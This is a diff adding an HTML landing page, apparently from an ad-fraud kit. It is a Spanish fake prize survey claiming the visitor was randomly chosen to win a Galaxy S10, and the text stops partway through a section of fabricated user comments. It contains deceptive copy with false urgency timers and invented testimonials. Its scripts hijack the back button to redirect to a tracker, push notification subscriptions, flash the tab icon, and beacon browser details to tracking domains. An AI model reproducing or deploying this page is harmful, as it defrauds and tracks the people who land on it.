@@ -1,0 +1,1007 @@
+<html>
+
+<head>
+    <base href="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, follow">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Alerta de premio!!!</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
+    <meta name="theme-color" content="#bc42a4">
+
+    <!-- 1. add push subscription -->
+    <link rel="manifest" href="/manifest.json" />
+    <!-- <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> -->
+    <!-- <script>
+		var OneSignal = window.OneSignal || [];
+		OneSignal.push(function() {
+			OneSignal.init({
+			appId: "0b51c11b-c190-40e7-8343-4f65e650a839",
+			});
+		});
+	</script> -->
+    <!-- [pre]land_id =  -->
+    <script>
+        var acrum_extra = {
+            "type": "prelanding",
+            "ccodes": ["MY"],
+            "location": [34.0584, -118.278],
+            "ip_city": "Los Angeles",
+            "iew": "false"
+        };
+    </script>
+    <script>
+        window.domain_has_valid_cert = true;
+        window.show_gdpr_warning = false;
+        window.is_adlt = false;
+        window.is_our_click = location.href.indexOf('oc_') !== -1;
+        window.dpush = location.href.indexOf('dpush_') !== -1 || !true;
+    </script>
+    <!-- 2. setup redirect urls -->
+    <script>
+        // tracker click url
+        window.main_click_url = "https://jat.trackingmydata.xyz/just_a_tracking";
+        // main offer url
+        window.redirect_url = window.main_click_url;
+        // back button url
+        window.next_url = "https://jat.trackingmydata.xyz/?c=1565&h=-RHrEre_&type=backbutton"
+        // preland redirect url
+        window.background_url = "";
+        // event tracking url
+        window.event_url = "https://jat.trackingmydata.xyz/event"
+        // tracker url
+        window.tracker_url = "https://jat.trackingmydata.xyz"
+    </script>
+
+    <script>
+        /*debounce lib, copied from github.com/cowboy/jquery-throttle-debounce*/
+        (function (b, c) {
+            var $ = b.jQuery || b.Cowboy || (b.Cowboy = {}),
+                a;
+            $.throttle = a = function (e, f, j, i) {
+                var h, d = 0;
+                if (typeof f !== "boolean") {
+                    i = j;
+                    j = f;
+                    f = c
+                }
+
+                function g() {
+                    var o = this,
+                        m = +new Date() - d,
+                        n = arguments;
+
+                    function l() {
+                        d = +new Date();
+                        j.apply(o, n)
+                    }
+
+                    function k() {
+                        h = c
+                    }
+                    if (i && !h) {
+                        l()
+                    }
+                    h && clearTimeout(h);
+                    if (i === c && m > e) {
+                        l()
+                    } else {
+                        if (f !== true) {
+                            h = setTimeout(i ? k : l, i === c ? e - m : e)
+                        }
+                    }
+                }
+                if ($.guid) {
+                    g.guid = j.guid = j.guid || $.guid++
+                }
+                return g
+            };
+            $.debounce = function (d, e, f) {
+                return f === c ? a(d, e, false) : a(d, f, e !== false)
+            }
+        })(this);
+    </script>
+    <script>
+        // ac analytics
+        function searchToObject() {
+            var e, n, o = window.location.search.substring(1).split("&"),
+                t = {};
+            for (n in o)
+                if (o.hasOwnProperty(n)) {
+                    if ("" === o[n]) continue;
+                    e = o[n].split("="), t[decodeURIComponent(e[0])] = decodeURIComponent(e[1])
+                }
+            return t
+        }
+        var eventsSender = function () {
+            var e = searchToObject();
+            e.esub = window.acrum_extra && window.acrum_extra.esub || e.esub;
+            var o = {
+                    url: window.tracker_url + "/event",
+                    on_focus: !0,
+                    events: {
+                        scrolled_on_site: 0,
+                        clicked_on_site: 0,
+                        time_on_site: 0,
+                        load_begins: 1,
+                        dom_loaded: 0,
+                        fully_loaded: 0
+                    },
+                    params: e,
+                    get_params: function () {
+                        var e, n = {};
+                        for (e in o.params) o.params.hasOwnProperty(e) && (n[e] = o.params[e]);
+                        for (e in o.events) n[e] = o.events[e];
+                        return n
+                    },
+                    // sendEvents: function(e, n, o) {
+                    //     var t = new XMLHttpRequest;
+                    //     t.open("POST", e, o), t.setRequestHeader("Content-type", "application/json; charset=utf-8"), t.send(n)
+                    // }
+                    sendEvent: function (eventNum) {
+                        var url = o.url + "?number=" + eventNum;
+                        var script = document.createElement("script");
+                        script.type = "text/javascript";
+                        script.src = url;
+                        document.body.appendChild(script);
+                    }
+                },
+                n = function () {
+                    o.events.scrolled_on_site = 1, window.removeEventListener("scroll", n), o.sendEvent('01')
+                };
+            window.addEventListener("scroll", n);
+            var t = function () {
+                o.events.clicked_on_site = 1, window.removeEventListener("click", t), o.sendEvent('03')
+            };
+            window.addEventListener("blur", function () {
+                o.on_focus = !1
+            }), window.addEventListener("focus", function () {
+                o.on_focus = !0
+            }), window.addEventListener("click", t), setInterval(function () {
+                o.on_focus && o.events.time_on_site++;
+                if (o.events.time_on_site === 60) {
+                    o.sendEvent('02');
+                }
+            }, 1e3), document.addEventListener("DOMContentLoaded", function () {
+                o.events.dom_loaded = 1
+            }), window.addEventListener("load", function () {
+                o.events.fully_loaded = 1
+                var host = window.tracker_url;
+                ! function () {
+                    var domain = document.domain;
+                    if (domain && domain.indexOf("localhost") === -1) {
+                        var d_now = new Date();
+                        var timezone = 0 - d_now.getTimezoneOffset() / 60;
+                        var userLanguage = navigator.language;
+                        var url = host + "/just_a_tracking?views=true" + "&timezone=" + timezone +
+                            "&userLanguage=" + userLanguage;
+                        var script = document.createElement("script");
+                        script.type = "text/javascript";
+                        script.src = url;
+                        document.body.appendChild(script);
+                    }
+                }();
+            }), navigator.sendEvents = o.sendEvents, window.onbeforeunload = function () {
+                // var e = o.get_params();
+                // navigator.sendEvents(o.url, e, !1);
+                // for (var n = 0; n <= 1e4; n++);
+            }
+        }();
+        // ac analytics
+    </script>
+
+    <!--suppress ES6ConvertVarToLetConst -->
+    <script>
+        var lang_locale = "zh";
+    </script>
+    <!-- browser locale -->
+    <script type="text/javascript">
+        var ccode = "MY";
+        var ip_ccode = "US";
+        var iew = false;
+    </script>
+    <script type="text/javascript" src="./dadbab.info/content/shared/js/jquery-1.12.4.min.js"></script>
+    <!-- <script type="text/javascript" src="./dadbab.info/content/shared/js/moment-with-locales-2.18.1.min.js"></script> -->
+    <script type="text/javascript" src="./dadbab.info/content/shared/js/dr-dtime.min.js"></script>
+    <!-- <script type="text/javascript" src="./dadbab.info/content/shared/js/order_me.min.js"></script> -->
+    <!-- <link type="text/css" href="./dadbab.info/content/shared/css/order_me.min.css" rel="stylesheet" media="all"> -->
+    <script>
+        (function () {
+            function isObject(obj) {
+                var type = typeof obj;
+                return type === "function" || type === "object" && !!obj
+            }
+
+            function updateObject(obj) {
+                var sources = [].slice.call(arguments, 1);
+                sources.forEach(function (source) {
+                    Object.getOwnPropertyNames(source).forEach(function (propName) {
+                        Object.defineProperty(obj, propName, Object.getOwnPropertyDescriptor(source,
+                            propName))
+                    })
+                });
+                return obj
+            }
+
+            function getURLParams() {
+                var params = decodeURIComponent(window.location.search.substr(1)).split("&");
+                var parsed = {};
+                for (var i = 0, length = params.length; i < length; i++) {
+                    var el = params[i],
+                        kv = el.split("=");
+                    if (!kv[0]) continue;
+                    if (kv.length === 1) {
+                        if (parsed.hasOwnProperty(el)) {
+                            if (isObject(parsed[el])) {
+                                parsed[el][parsed[el].length] = ""
+                            } else {
+                                parsed[el] = [parsed[el], ""]
+                            }
+                        } else {
+                            parsed[kv[0]] = ""
+                        }
+                    } else {
+                        var k = kv[0];
+                        var v = kv.slice(1).join("=");
+                        if (parsed.hasOwnProperty(k)) {
+                            if (isObject(parsed[k])) {
+                                parsed[k][parsed[k].length] = v
+                            } else {
+                                parsed[k] = [parsed[k], v]
+                            }
+                        } else {
+                            parsed[k] = v
+                        }
+                    }
+                }
+                return parsed
+            }
+            window.get_params = function () {
+                return updateObject(getURLParams(), {
+                    offer_id: parseInt("7000"),
+                    safe_uid: "59de92f6d28f32d15fd2201911d27a2e",
+                    preland_id: parseInt("44161"),
+                    slave_prefix_id: "us",
+                    country_code: "vn",
+                    browser_locale: "zh",
+                    order_placed: parseInt("1"),
+                    etag: window["__sc_int_uid"]
+                })
+            }
+        })();
+
+        var g_popupShown = false;
+        window.show_pushwru_show = function () {
+            if (location.protocol === "https:" && !g_popupShown) {
+                g_popupShown = true;
+                setTimeout(function () {
+                    // 5. popup push subscription
+                    var scr = document.createElement("script");
+                    scr.src = "https://cdn.onesignal.com/sdks/OneSignalSDK.js";
+                    scr.onload = function () {
+                        var OneSignal = window.OneSignal || [];
+                        OneSignal.push(function () {
+                            OneSignal.init({
+                                appId: "0b51c11b-c190-40e7-8343-4f65e650a839",
+                            });
+                        })
+                    };
+                    document.head.appendChild(scr)
+                }, 1)
+            }
+        };
+        window.get_same_location_with_push = function () {
+            var url = location.href.replace("http", "https").replace("#init", "");
+            sep = url.indexOf("?") === -1 ? "?" : "&";
+            url += sep + "showing_push_=1";
+            return url
+        };
+        if (location.protocol === "https:" && window.sawpp !== true && window.location.href.indexOf("showing_push_") > -
+            1 && window.dpush !== true) {
+            show_pushwru_show()
+        }
+        history.pushState({
+            init: true
+        }, document.title, "");
+        $(window).on("popstate", function (e) {
+            if (acrum_extra && acrum_extra.type === "landing" && location.protocol === "https:" && (is_adlt ||
+                    is_our_click)) {
+                history.pushState({
+                    init: true
+                }, document.title, "")
+            }
+            var sep = "";
+            if (acrum_extra && acrum_extra.type === "prelanding") {
+                // 6. update back button redirect url
+                var next_url = window.next_url;
+                sep = next_url.indexOf("?") === -1 ? "?" : "&";
+                next_url += sep + "cb=1";
+                if (window.dpush === true || window.sawpp === true || location.protocol === "http:") {
+                    window.location = next_url
+                } else {
+                    window.location = next_url
+                    // show_pushwru_show();
+                    // window.open(next_url, "_blank");
+                }
+            } else if (window.sawpp !== true && window.dpush !== true) {
+                if (window.domain_has_valid_cert === true && location.protocol === "http:") {
+                    location.replace(get_same_location_with_push())
+                } else if (location.protocol === "https:") {
+                    show_pushwru_show()
+                }
+            }
+        });
+
+        function move_next(a, obj) {
+            {
+                if (!Object.keys) {
+                    Object.keys = function (obj) {
+                        var keys = [];
+                        for (var i in obj) {
+                            if (obj.hasOwnProperty(i)) {
+                                keys.push(i);
+                            }
+                        }
+                        return keys;
+                    };
+                }
+                // 7. update offer click url
+                var redirect_url = window.redirect_url;
+                if (obj !== undefined) {
+                    redirect_url += '&' + Object.keys(obj).map(k => k + '=' + encodeURIComponent(obj[k])).join('&');
+                }
+                // 8. update prelanding redirect url, often for teaser pages
+                var background_url = window.background_url;
+                if (background_url === "" && window.sawpp !== true && window.dpush !== true) {
+                    if (window.domain_has_valid_cert === true &&
+                        location.protocol === "http:") {
+                        background_url = get_same_location_with_push();
+                    } else if (location.protocol === "https:") {
+                        setTimeout(function () {
+                            window.show_pushwru_show && window.show_pushwru_show();
+                        }, 1);
+                    }
+                }
+                if (background_url !== '') {
+                    location.replace(background_url);
+                }
+                $(window).off("beforeunload");
+                a.preventDefault();
+                a.stopPropagation();
+                var open_target = '';
+                open_target === 'self' ?
+                    window.open(redirect_url, "_self") :
+                    window.open(redirect_url);
+            }
+        }
+
+        function onEtag(etag) {
+            console.log(etag);
+            var img = new Image(1, 1);
+            img.src = 'https://xl-trk.com/track.gif?' +
+                'a=pat' +
+                '&b=' + etag +
+                '&c=' + acrum_extra.type +
+                '&d=' + acrum_extra.offer_id +
+                '&e=' + acrum_extra.id +
+                '&f=' + acrum_extra.esub;
+        }
+
+        function hide_warn() {
+            $('.ac_gdpr_fix').hide();
+        }
+        $(document).ready(function () {
+            // var syncScript = document.createElement("script");
+            // syncScript.type = "text/javascript";
+            // syncScript.src = "https://sync.users-api.com/e.js";
+            // syncScript.onerror = function() {
+            //     window["__sc_int_uid"] = "ssp-etg-error"
+            // };
+            // document.getElementsByTagName("head")[0].appendChild(syncScript);
+            // var interval = setInterval(function() {
+            //     if (window["__sc_int_uid"]) {
+            //         onEtag(window["__sc_int_uid"]);
+            //         clearInterval(interval)
+            //     }
+            // }, 100);
+
+
+            // $("a").not('[href="http://ac-feedback.com/report_form/"]').click(function(a) {
+            // 	{
+            // 		move_next(a)
+            // 	}
+            // });
+            // $("form").submit(function(a) {
+            // 	{
+            // 		move_next(a)
+            // 	}
+            // });
+            // // goto redirect ulr for class link and cta
+            // $('.link,.cta').click(function(a) {
+            // 	{
+            // 		move_next(a)
+            // 	}
+            // });
+
+            var TitleChange;
+            (function () {
+                var smile = "☺";
+                var currentText = smile;
+                var title = document.title;
+                var adc_favic = ["./dadbab.info/content/!common_files/images/favi3.ico"];
+                var interval;
+                var deffaultIcon;
+                var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent) || navigator
+                    .userAgent.indexOf("MSIE") >= 0;
+                var nodeList = document.querySelectorAll("link[rel*='icon']");
+                deffaultIcon = nodeList.length ? nodeList[nodeList.length - 1].href :
+                    "./dadbab.info/content/!common_files/images/star.ico";
+                var img = new Image;
+                var adc_init = function () {
+                    if (!nodeList.length) {
+                        link = document.createElement("link");
+                        link.type = "image/x-icon";
+                        link.rel = "shortcut icon";
+                        link.href = deffaultIcon;
+                        document.getElementsByTagName("head")[0].appendChild(link)
+                    } else {
+                        setAllLinks(nodeList, true)
+                    }
+                };
+                img.onload = function () {
+                    deffaultIcon = img.height ? deffaultIcon :
+                        "./dadbab.info/content/!common_files/images/star.ico";
+                    adc_favic.push(deffaultIcon);
+                    adc_init()
+                };
+                img.onerror = function () {
+                    deffaultIcon = "./dadbab.info/content/!common_files/images/star.ico";
+                    adc_favic.push(deffaultIcon);
+                    adc_init()
+                };
+                img.src = deffaultIcon;
+                var setAllLinks = function (nodelist, setDefault) {
+                    [].forEach.call(nodelist, function (item) {
+                        item.href = setDefault ? deffaultIcon : adc_favic[0]
+                    });
+                    !setDefault && adc_favic.reverse()
+                };
+                TitleChange = {
+                    start: function () {
+                        !interval && (interval = setInterval(function () {
+                            if (isSafari) {
+                                currentText = currentText === smile ? title : smile;
+                                document.title = currentText
+                            } else {
+                                setAllLinks(document.querySelectorAll(
+                                    "link[rel*='icon']"))
+                            }
+                        }, 500))
+                    },
+                    stop: function () {
+                        nodeList = document.querySelectorAll("link[rel*='icon']");
+                        interval && clearInterval(interval);
+                        interval = undefined;
+                        adc_favic[0] !== deffaultIcon && adc_favic.reverse();
+                        isSafari && (document.title = title) || setAllLinks(nodeList)
+                    }
+                }
+            })();
+            window.onblur = function () {
+                TitleChange.start()
+            };
+            window.onfocus = function () {
+                TitleChange.stop()
+            };
+
+
+            function getParameterByName(name, url) {
+                if (!url) url = window.location.href;
+                name = name.replace(/[\[\]]/g, "\\$&");
+                var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                    results = regex.exec(url);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, " "));
+            }
+        });
+    </script>
+    <script>
+        function dtime_nums(d, like_eu) {
+            var now = new Date();
+            now.setDate(now.getDate() + d + 1);
+            var dayNum = '';
+            if (now.getDate() < 10) {
+                dayNum = '0'
+            }
+            dayNum += now.getDate();
+            var monthNum = '';
+            if (now.getMonth() + 1 < 10) {
+                monthNum = '0'
+            }
+            monthNum += now.getMonth() + 1;
+            if (like_eu === !0) {
+                document.write(dayNum + "." + monthNum + "." + now.getFullYear())
+            } else {
+                document.write(monthNum + "." + dayNum + "." + now.getFullYear())
+            }
+        }
+    </script>
+    <!-- <script>
+        (function (window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function () {
+                        location.replace(
+                            "https://2436.net/visit.php?source=exitpop&country=AR&lp=3&cid=m20190816060C55E6id845497&partner_id=feed&pid=429856&type=source_32_MegaPush"
+                        );
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+    </script> -->
+    <link rel="stylesheet" href="./css.css">
+    <link rel="stylesheet" href="./all.css">
+    <link rel="stylesheet" href="./style.css">
+    <link href="./dadbab.info/content/shared/css/bootstrap.min.css" rel="stylesheet">
+    <script src="./dadbab.info/content/shared/js/bootstrap.min.js"></script>
+    </script>
+    <script type="text/javascript">
+        var portal = 'es';
+        var theme = '3-Samsung_S10';
+        var template = 'surbox';
+        var brand_country = 'Argentina';
+        var dayNames = Array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");
+        var monthNames = new Array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto",
+            "Septiembre", "Octubre", "Noviembre", "Diciembre");
+        var img_regalo = "principal.png";
+        var minutos_y = "Minuto y ";
+        var segundos = "Segundos";
+        var move_next = move_next;
+        var url_f = "https://jat.trackingmydata.xyz/just_a_tracking";
+        var modalOptions = {
+            backdrop: 'static',
+            keyboard: false
+        };
+    </script>
+    <script defer="" src="./p.min.js"></script>
+    <script type="text/javascript" src="dadbab.info/content/shared/js/my-dr-time.js"></script>
+</head>
+
+<body>
+    <script>
+        window.addEventListener('load', function () {
+            var tracker_domain = "https://jat.trackingmydata.xyz/";
+            ! function () {
+                var d_now = new Date();
+                var timezone = 0 - d_now.getTimezoneOffset() / 60;
+                var userLanguage = navigator.language;
+                var platform = navigator.platform;
+                var hm = document.createElement("script");
+                hm.src = tracker_domain + "just_a_tracking?views=true" + "&timezone=" + timezone +
+                    "&userLanguage=" + userLanguage + "&platform=" + platform;
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            }();
+        });
+    </script>
+    <div id="p_loading" style="display: none;">
+        <div class="d-flex justify-content-center" style="margin: 0 auto;">
+            <div class="spinner-border" role="status"> <span class="sr-only">Loading...</span> </div>
+        </div>
+    </div>
+    <div id="p_body_content">
+        <div id="id1" class="header">
+            <p> <img src="./logo.png"> <img src="./ES.png" style="float: right;padding-right: 5px;"> <a
+                    href="https://jat.trackingmydata.xyz/event?number=10" style="display:none">ok</a></p>
+        </div>
+        <div class="content">
+            <div style="display: flex; margin: 0 0 12px 0;">
+                <div class="header_flex_item"> Programa de fidelización! </div>
+                <div class="header_flex_item" style="text-align: right;"> <span class="p_var-dia"><script>dtime_day(0);</script></span> &nbsp;<span
+                        class="p_var-mes_nombre"><script>dtime_month(0);</script></span>, <span class="p_var-anyo"><script>dtime_year(0);</script></span> </div>
+            </div>
+            <div class="main-content flag" id="content1">
+                <h2 style="font-weight: bold;">Enhorabuena!!</h2>
+                <p> Hoy <strong> <span id="today" style="color:#bc42a4"> <span class="p_var-dia"><script>dtime_day(0);</script></span> &nbsp;<span
+                                class="p_var-mes_nombre"><script>dtime_month(0);</script></span>, <span class="p_var-anyo"><script>dtime_year(0);</script></span> </span>
+                    </strong> Has sido seleccionado al azar para participar en esta encuesta. Sólo te llevará un minuto
+                    y podrás recibir un premio: ¡Un <span class="p_var-producto">Galaxy S10</span> ! </p>
+                <div class="caja_premio" style="max-width: 100%; margin: 0 auto;">
+                    <div class="principal_bg"> <img class="img-principal principal_efect" src="./principal.png"
+                            style="max-width: 310px;margin: 0px auto;display: block;width: 100%;cursor:pointer;"> </div>
+                </div>
+                <p> Como cada <span class="p_var-dia_nombre">Martes</span> <strong> <span id="today"
+                            style="color:#bc42a4"> elegimos a 10 usuarios al azar para darles la posibilidad de ganar
+                            fabulosos premios. El premio de hoy es un <span class="p_var-producto">Galaxy S10</span> !*.
+                        </span> Sólo <span style="color:#bc42a4">10 afortunados</span> </strong> serán los ganadores y
+                    sólo si vives en Argentina! </p>
+                <p>Esta encuesta sólo se realiza con fines estadísticos para mejorar el servicio de los usuarios.</p>
+                <p> Sólo tienes <font color="red"> <b> <span id="timerr" style="color:#bc42a4">2 Minuto y 18
+                                Segundos</span> </b> </font>, para poder participar. </p>
+                <p>¡Date prisa, el número de premios es limitado!</p>
+                <div class="main-content flag" id="questions_all" data-total="4">
+                    <div id="q1">
+                        <p class="question"> <strong>Pregunta 1 de 4:</strong> &nbsp;<span>¿Eres hombre o mujer?</span>
+                        </p>
+                        <div class="survey_button bq bq1" data-question="1" data-bq="1">Hombre</div>
+                        <div class="survey_button bq bq1" data-question="1" data-bq="2">Mujer</div>
+                    </div>
+                    <div id="q2">
+                        <p class="question"> <strong>Pregunta 2 de 4:</strong> &nbsp;<span>¿Cuál es su aplicación
+                                favorita?</span> </p>
+                        <div class="survey_button bq bq2" data-question="2" data-bq="1">Facebook</div>
+                        <div class="survey_button bq bq2" data-question="2" data-bq="2">Instagram</div>
+                        <div class="survey_button bq bq2" data-question="2" data-bq="3">Whatsapp</div>
+                    </div>
+                    <div id="q3">
+                        <p class="question"> <strong>Pregunta 3 de 4:</strong> &nbsp;<span>¿Cual su compañía de
+                                teléfono?</span> </p>
+                        <div class="survey_button bq bq3" data-question="3" data-bq="1">Movistar</div>
+                        <div class="survey_button bq bq3" data-question="3" data-bq="2">Vodafone</div>
+                        <div class="survey_button bq bq3" data-question="3" data-bq="3">Orange</div>
+                        <div class="survey_button bq bq3" data-question="3" data-bq="4">Otra</div>
+                    </div>
+                    <div id="q4">
+                        <p class="question"> <strong>Pregunta 4 de 4:</strong> &nbsp;<span>¿Utilizas el móvil para
+                                jugar?</span> </p>
+                        <div class="survey_button bq bq4" data-question="4" data-bq="1">Si</div>
+                        <div class="survey_button bq bq4" data-question="4" data-bq="2">No</div>
+                    </div>
+                </div>
+            </div>
+            <div class="main-content" id="content2">
+                <h2 style="text-align:center">Verificando sus respuestas ...</h2>
+                <div class="d-flex justify-content-center">
+                    <div class="spinner-border m-3" role="status"> <span class="sr-only">Loading...</span> </div>
+                </div>
+                <p class="result" id="result1">¡Respondió 4/4 preguntas!</p>
+                <p class="result" id="result2">No hay más encuestas anteriores desde su IP.</p>
+                <p class="result" id="result3">¡Todavía hay regalos disponibles!</p>
+            </div>
+            <div class="main-content" id="content3">
+                <script type="text/javascript">
+                    var box_ini = false;
+                </script>
+                <div id="boxes" class="boxes">
+                    <div class="div_img_gift"> <img class="img_gift box-gift" src="./box-gift.png"> </div>
+                    <div id="0" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="1" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="2" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="3" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="4" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="5" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="6" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="7" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="8" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="9" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="10" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                    <div id="11" class="try temblor">
+                        <div class="caja_tapa"> <img class="box-01" src="./box-01.png">
+                        </div>
+                        <div class="caja_trasera"> <img class="box-03" src="./box-03.png">
+                        </div>
+                        <div class="caja_gift"> <img class="box-04" src="./box-04.png">
+                        </div>
+                        <div class="caja"> <img class="box-02" src="./box-02.png"> </div>
+                    </div>
+                </div>
+                <div id="p_modal1" class="modal fade text-center p_modal" tabindex="-1" role="dialog"
+                    aria-hidden="true">
+                    <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                            <div class="modal-body"> <img class="temblor_inf box-00" src="./box-00.png">
+                                <h2>¡Enhorabuena, tus respuestas han sido validadas correctamente!</h2>
+                                <p> Hoy <span class="p_var-dia"><script>dtime_day(0);</script></span> de <span
+                                        class="p_var-mes_nombre"><script>dtime_month(0);</script></span> tienes la oportunidad de llevarte un
+                                    <span class="p_var-producto">Galaxy S10</span> ! <br>
+                                    <br>
+                                    Todo lo que tienes que hacer es elegir la caja de regalo correcta.<br>
+                                    <br>
+                                    Tienes 3 intentos, ¡buena suerte! </p>
+                                <button type="button" id="p_modal_button1" class="btn btn-success btn-lg"
+                                    style="background-color:#bc42a4; border-color:#bc42a4">OK</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="p_modal2" class="modal fade text-center p_modal" tabindex="-1" role="dialog"
+                    aria-hidden="true">
+                    <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                            <div class="modal-body">
+                                <div class="circle-loader">
+                                    <div class="checkmark draw"></div>
+                                </div>
+                                <h2>OHHH...</h2>
+                                <p> Lo sentimos, este regalo está vacío! Aún te quedan (<span id="num_intentos">3</span>
+                                    ) intentos. ¡Buena suerte! </p>
+                                <button type="button" id="p_modal_button2" class="btn btn-success btn-lg"
+                                    style="background-color:#bc42a4; border-color:#bc42a4">OK</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="p_modal3" class="modal fade text-center p_modal" tabindex="-1" role="dialog"
+                    aria-hidden="true">
+                    <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                            <div class="modal-body"> <img class="box-gift" src="./box-gift.png">
+                                <h2>¡LO HAS CONSEGUIDO!</h2>
+                                <p> ¡Has conseguido un <span class="p_var-producto">Galaxy S10</span> !<br>
+                                    <br>
+                                    Sigue las siguientes instrucciones y estarás un paso más cerca de tu regalo! </p>
+                                <button onclick="track();" type="button" id="p_modal_button3"
+                                    class="btn btn-success btn-lg"
+                                    style="background-color:#bc42a4; border-color:#bc42a4">OK</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="main-content">
+                <div class="comments_face">
+                    <div class="comments">
+                        <p style="margin:0;padding:0;float:left;display:block;width:50%"> <span
+                                style="color:#3b5998">Más opiniones</span> </p>
+                        <p
+                            style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">
+                            50 de 80</p>
+                        <div style="clear:both"></div>
+                    </div>
+                    <div class="comments" id="comment0" style="display:block">
+                        <div class="profile"> <img src="./3.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Alejandro Ruiz</p>
+                            <p>¡Eso es genial, nunca había ganado nada! </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">42 </span>
+                            ·15 &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment1" style="display:block">
+                        <div class="profile"> <img src="./8.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Luisa García</p>
+                            <p>Mierda no ganó nada :( </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">7 </span> ·14
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment2" style="display:block">
+                        <div class="profile"> <img src="./9.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Marcos Quevedo</p>
+                            <p>¿Alguna otra encuesta que pueda hacer? </p>
+                        </div>
